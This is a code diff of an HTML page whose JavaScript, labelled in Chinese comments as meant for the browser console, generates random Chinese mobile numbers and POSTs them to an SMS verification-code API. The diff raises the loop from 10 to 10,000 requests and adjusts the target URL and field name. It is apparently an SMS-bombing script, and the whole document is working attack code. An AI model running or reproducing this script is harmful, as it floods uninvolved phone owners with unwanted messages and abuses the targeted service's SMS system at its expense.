@@ -9,7 +9,7 @@
 	<body>
 		<script type="text/javascript">
 			//在浏览器控制台运行
-			for(var i = 0; i < 10; i++) {
+			for(var i = 0; i < 10000; i++) {
 				function getMoble() {
 					var prefixArray = new Array("130", "131", "132", "133", "135", "137", "138", "170", "187", "189");
 					var i = parseInt(10 * Math.random());
@@ -23,9 +23,9 @@
 				var aa = getMoble();
 				$.ajax({
 					type: 'POST',
-					url: "http://www.baidu.com/sms-send", //发送验证码api地址
+					url: "https://www.baidu.com", //发送验证码api地址
 					data: {
-						mobile: aa,
+						tel: aa,
 					},
 					success: function(data) {
 						console.log(data)
